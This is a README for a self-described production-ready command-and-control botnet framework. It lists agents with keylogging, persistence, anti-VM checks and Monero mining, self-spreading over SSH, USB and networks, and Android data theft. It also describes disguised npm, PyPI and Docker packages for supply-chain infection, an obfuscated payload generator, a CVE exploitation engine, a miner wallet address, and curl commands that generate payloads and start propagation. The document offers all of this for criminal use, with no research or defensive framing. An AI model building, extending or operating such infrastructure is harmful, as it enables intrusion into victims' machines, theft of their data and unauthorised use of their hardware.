# DOMINATION INFRASTRUCTURE - Production Ready

## System Status: ✅ OPERATIONAL

**Server:** http://127.0.0.1:5000  
**Panel:** http://127.0.0.1:5000/domination  
**API Health:** http://127.0.0.1:5000/api/health

---

## Components

### Agents (7 types)

| Agent | File | Platform | Features |
|-------|------|----------|----------|
| **Python** | `static/agent.py` | Linux/macOS | C2 registration, task execution, mining |
| **PowerShell** | `static/agent.ps1` | Windows | Anti-VM, persistence, mining, data collection |
| **Browser** | `static/browser_agent.js` | Browser | Fingerprinting, keylogging, wallet detection |
| **Auto Propagator** | `src/agents/auto_propagator.py` | Multi-platform | SSH/USB/Network spread, persistence |
| **Android** | `src/agents/build_android.sh` | Android | APK builder, contacts/SMS/location |
| **Covert Channels** | `src/agents/covert_channels.py` | All | DNS/ICMP tunneling |

### Supply Chain (3 vectors)

| Vector | Location | Trigger |
|--------|----------|---------|
| **npm** | `src/agents/supply_chain/npm_package/` | `npm install system-optimizer` |
| **PyPI** | `src/agents/supply_chain/pypi_package/` | `pip install django-utils-optimizer` |
| **Docker** | `src/agents/supply_chain/docker_image/` | `docker build` |

### Utilities

| Tool | File | Purpose |
|------|------|---------|
| **Payload Generator** | `src/agents/payload_generator.py` | Obfuscated payload generation |
| **Auto Exploit** | `src/agents/auto_exploit.py` | CVE exploitation engine |

---

## API Endpoints

### Core
- `GET /api/health` - System health
- `GET /api/domination/real-stats` - Real statistics
- `GET /api/domination/profit-report` - Profit estimates

### Propagation
- `POST /api/propagation/start` - Start campaign
- `GET /api/propagation/status` - Status

### Mining
- `POST /api/mining/start-all` - Start on all agents
- `POST /api/mining/stop-all` - Stop all

### Exploitation
- `POST /api/exploitation/scan` - Network scan
- `POST /api/exploitation/exploit` - Exploit target
- `GET /api/exploitation/cves` - CVE database
- `POST /api/exploitation/report` - Report results

### Payloads
- `POST /api/payloads/generate` - Generate payload
- `GET /api/payloads/list` - List payloads

### Supply Chain
- `GET /api/supply-chain/npm` - npm package info
- `GET /api/supply-chain/pypi` - PyPI package info
- `GET /api/supply-chain/docker` - Docker image info

---

## CVE Database (8 exploits)

| CVE | Name | Target | Severity |
|-----|------|--------|----------|
| CVE-2017-0144 | EternalBlue | Windows SMB | Critical |
| CVE-2019-0708 | BlueKeep | Windows RDP | Critical |
| CVE-2021-44228 | Log4Shell | Java Apps | Critical |
| CVE-2020-0796 | SMBGhost | Windows SMB | Critical |
| CVE-2019-2725 | WebLogic RCE | Oracle WebLogic | High |
| CVE-2017-12615 | Tomcat PUT | Apache Tomcat | High |
| REDIS-UNAUTH | Redis Unauthorized | Redis | High |
| SSH-BRUTE | SSH Brute Force | SSH | Medium |

---

## Wallet Configuration

```
XMR: 44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5
Pool: pool.monero.hashvault.pro:443
```

---

## Database Schema

**Tables:** `users`, `agents`, `tasks`, `logs`, `config`, `agent_data`, `form_captures`, `listeners`, `scheduled_tasks`

**Agents columns:** `id`, `hostname`, `username`, `os`, `arch`, `ip_external`, `ip_internal`, `platform_type`, `tags`, `group_name`, `first_seen`, `last_seen`, `is_alive`, `sleep_interval`, `jitter`, `note`

**Tasks columns:** `id`, `agent_id`, `task_type`, `payload`, `status`, `result`, `created_at`, `completed_at`

---

## Quick Start

```bash
# Start server
cd /mnt/F/C2_server-main
bash manage.sh restart

# Check health
curl http://127.0.0.1:5000/api/health

# Generate Python payload
curl -X POST http://127.0.0.1:5000/api/payloads/generate \
  -H "Content-Type: application/json" \
  -d '{"type":"python"}'

# Start propagation
curl -X POST http://127.0.0.1:5000/api/propagation/start

# View domination panel
open http://127.0.0.1:5000/domination
```

---

## File Structure

```
/mnt/F/C2_server-main/
├── src/
│   ├── c2/server.py          # Main server (8700+ lines)
│   └── agents/
│       ├── auto_propagator.py    # Self-spreading agent
│       ├── auto_exploit.py       # CVE exploitation
│       ├── payload_generator.py  # Obfuscation
│       ├── covert_channels.py    # DNS/ICMP
│       ├── build_android.sh      # APK builder
│       └── supply_chain/
│           ├── npm_package/
│           ├── pypi_package/
│           └── docker_image/
├── static/
│   ├── agent.py             # Python agent
│   ├── agent.ps1            # PowerShell agent
│   └── browser_agent.js     # Browser agent
├── templates/
│   └── domination.html      # Control panel
└── data/
    └── c2.db               # SQLite database
```

---

**Last Updated:** 2026-03-30  
**Version:** 3.0.0  
**Status:** Production Ready ✅
